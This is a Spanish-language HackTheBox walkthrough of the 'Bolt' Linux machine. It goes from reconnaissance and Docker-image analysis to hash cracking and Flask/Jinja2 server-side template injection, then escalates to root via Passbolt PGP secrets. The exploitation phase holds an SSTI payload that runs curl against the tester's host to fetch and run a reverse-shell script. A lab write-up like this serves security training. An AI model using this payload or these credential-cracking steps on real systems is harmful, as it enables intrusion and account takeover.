
-- - 
- Tags: #HTB #Medium #linux #SSTI #OWASPTOP10 
- -- 
#### QUÉ SE EXPLOTA?

Information Leakage
Subdomain Enumeration
SSTI (Server Side Template Injection)
Abusing PassBolt
Abusing GPG

#### WRITE UP

##### PRIMERA FASE: Reconocimiento

De cosutmbe vamos a empezar **lanzando un ping** para determinar si la máquina se encuentra áctiva y también para determinar el Sistema operativo mediante el **TTL útilizado**. 

![](../imgs/Pasted image 20251215125422.png)

**TTL = 63** por lo tanto estamos ante una máquina con sistema operativo Linux.

**Posteriormente iniciamos los escaneos con nmap** como ya sabemos primero queremos todos los puertos abiertos de una máquina. Además para esto utilzaremos un **SYN scan**. 

![](../imgs/Pasted image 20251215125816.png)

Descubrimos los puertos 22,80 y 443 abiertos, por lo que proseguimos a hacer **el segundo escaneo** como ya sabemos **el objetivo del segundo escaneo es obtener mayor información sobre los puertos previamente encontrados** 

![](../imgs/Pasted image 20251215130100.png)

**Proseguimos a inspeccionar el certificado SSL**

```bash

openssl s_client -connect 10.10.11.114:443
```


![](../imgs/Pasted image 20251215130325.png)

Primeramente encontramos un subdominio. Por lo cual **agregamos tanto el subdominio como el dominio al [[etc-hosts]]**. 

Proseguimos a inspeccionar los dominos encontrados.

En el puerto 80 encontramos un recurso descargable, que se supone es el programa. **Lo descargamos para inspeccionarlo**. 

![](../imgs/Pasted image 20251215145803.png)
**Es un archivo, por lo que antes de descomprimirlo lo inspeccñionamos**

```bash
7z l image.tar
```


Nos percatamos que dentro de ese archivo había más archivos comprimidos, por lo que queremos ver que hay detnro de esos comprimidos. 

```bash

7z l image.tar f| grep '.tar' | awk 'NF{print $NF}'

```

ya que filtramos la información, aplicamos un bucle para poder listar el contenido de todos los **.tar** restantes. 

```bash

for file in $(7z l image.tar f| grep 'layer.tar' | awk 'NF{print $NF}'); do echo -e "\n[+]Los datos de $file:\n";7z l $file; done | less -S

```

**ocupamos less para poder ver todo el contenido**. 

Filtramos por nuestras marcas '[+]' para ir recorriendo cada **.tar** 

**Nos encontramos con una base de datos que pertenecía a [[SQlite]]** 

![](../imgs/Pasted image 20251215152842.png)

**Nos dirijimos a esa ruta para descomprimir unicamente esa ruta tar**

```bash

cd $(dirname a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar)

```

Ese comando sirve para extraer la ruta padre de un archivo. Es decir quita los archivos y únicmanete nos deja en la ruta. 

**Ya que descomprimimos**, nos conectamos a la base de datos y además pudimos extraer un usuario y una contraseña de dicha **base de datos** 
```bash
tar -xf layer.tar
```

```bash
sqlite3 db.sqlite3
```

**Utilizamos los comandos de [[SQlite]]**

![](../imgs/Pasted image 20251215153844.png)

**Proseguimos a utilizar [[John the ripper]] para tratar de descubrir el hash que encontramos** 

```bash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![](../imgs/Pasted image 20251215154827.png)

**Encontramos una contraseña**

Ya con una contraseña y un usuario, podemos tratar de conectarnos en el panel de **Login** que encontramos en el reconocimiento previo. Sin embargo, antes de eso, pasamos a verificiar el puerto **443** y también a ver si existen más subdominios. 

```bash

gobuster vhost /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -u http://bolt.htb
```

![](../imgs/Pasted image 20251216142757.png)

Encontramos 2 subdominios más. En demo.bolt.htb podemos crear una cuenta, sin embargo, nos pide un codigo de autenticación. **Podemos buscar algo relacionado de acuerdo al nombre del campo** en el **.tar** que ya tenemos de antes. 

![](../imgs/Pasted image 20251216143722.png)

El campo se llama **invite code**

Buscamos en el **.tar** 

```bash

grep -r -i --text 'invite_code'

```

encontramos que sí hay coincidencias.

![](../imgs/Pasted image 20251216143917.png)

Descomprimimos los archivos para revisar si alguno contiene el **invite_code**, además descubrimos que el programa utiliza **[[Flask]]** lo cual puede hacerlo vulnerable a **[[SSTI]]** 

![](../imgs/Pasted image 20251216144214.png)

Encontramos en el archivo las **invite_code** ![](../imgs/Pasted image 20251216144333.png)

Creamos un usuario, y después de investigar el sitio vemos que, en la sección **settings** nos indica que para hacer cambios nos solicitará confirmación de correo. **Esto nos hace pensar que están ligados tanto el correo como el sitio web** intentamos acceder al correo con el mismo usuario y funciona.  (Seguramente al crear la cuenta tmbn se crea un correo).

##### SEGUNDA FASE: Explotación

Proseguimos a verificar si a través del cambio de nombre o en alguna entrada hay **[[SSTI]]**.

![](../imgs/Pasted image 20251217083814.png)

Cuando cambiamos el nombre, nos llega un correo de confirmación donde en el correo se ve reflejado el cambió que hicimos.

![](../imgs/Pasted image 20251217083903.png)

Así que intentamos con un payload de **[[SSTI]]**. 

```bash

{{7*9}}

```

Si a la hora de hacer el cambio recibimos e lresultado en lugar de la operación, comprobariamos que hay  **[[SSTI]]** 

![](../imgs/Pasted image 20251217084107.png)


**Confirmamos el mail, y verificamos nuevamente en nuestro correo si los cambios se efectuaron** 

![](../imgs/Pasted image 20251217084201.png)

Recibimos el resultado, por lo tanto hay **[[SSTI]]** 

**Ahora utilizamos el siguiente payload para enviarnos conexión a ver si ercibimos**

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl http://10.10.16.4/rav').read() }}
````

Cuando confirmamos el correo nos llega una petición. 

![](../imgs/Pasted image 20251217084726.png)

Creamos nuestro archivo **rav**  y en el curl añadimos que se interprete con bash, junto con un script de **[[Reverse shell]]** y listo. nos enviamos conexión. 

![](../imgs/Pasted image 20251217085210.png)

##### TERCERA FASE: Postexplotación - Privesc

Empezamos buscando posibles vectores para escalar privilegios, sin embargo, no encontramos mucho que fuera de utilidad, por lo que decidimos de una usar **[[linpeas]]** 

Nos dirigimos a la ruta **/tmp** y ahí descargamos el binario. 

![](../imgs/Pasted image 20251217150112.png)


Una vez que ya tenemos el binario lo ejecutamos y esperamos a que complete el escaneo. 

**Encontramos lo siguiente haciendo referencia a [[MariaDB]] y además encontramos algo relacionado a [[Passbolt]]**

![](../imgs/Pasted image 20251217160254.png)

Además probamos la misma contraseña para ver si podíamos cambiar a alguno de los usuarios existentes. 

![](../imgs/Pasted image 20251217160405.png)

**Logramos cambiar al usuario Eddie** 

![](../imgs/Pasted image 20251217161838.png)

Ahora, nos conectamos a **MYSQL**

```bash

mysql -u passbolt -p 

```

Dentro de enumeramos y obtuvimos un mensaje en **[[PGP]]**

![](../imgs/Pasted image 20251217162046.png)

**Como ya sabemos, [[Passbolt]] ocupa [[PGP]]** por lo que tenemos que encontrar si o sí, alguna clave privada para poder leer el mensaje o los **secrets** de **passbolt**. Como ya conocemos el patrón por el cual empieza el **hash PGP** lo buscamos con **grep**

```bash

grep -r 'BEGIN PGP PRIVATE'

```

![](../imgs/Pasted image 20251217165611.png)

**El último archivo binario** se ve que son logs, por lo tanto decidimos ver primero ese ya que grep nos está indicando que dentro de ese binario hay algo que hace match con **'BEGIN PGP PRIVATE'** 

Verificamos el binario y nos encontramos con:

![](../imgs/Pasted image 20251217173658.png)

**Ahora con ayuda de chatgpt simplemente le decimos que nos deje bien el formato** 

![](../imgs/Pasted image 20251217173942.png)

**Copiamos la key** y con gpg2john tratamos de descrackear.

```bash

gpg2john private.key > hash

```

![](../imgs/Pasted image 20251217180128.png)

```bash

john --wordlist=/usr/share/wordlists/rockyou.txt hash

```


![](../imgs/Pasted image 20251217180035.png)

Ahora toca desencriptar el mensaje:

```bash

gpg --import eddie.key
```

**nos pedirá la contraseña**

```bash
gpg --decrypt crypted_mssg
```

![](../imgs/Pasted image 20251217180538.png)

**Hay una contraseña, intentamos cambiarnos a root** 

**FUNCIONA** !! TENEMOS ROOT. 

![](../imgs/Pasted image 20251218085019.png)









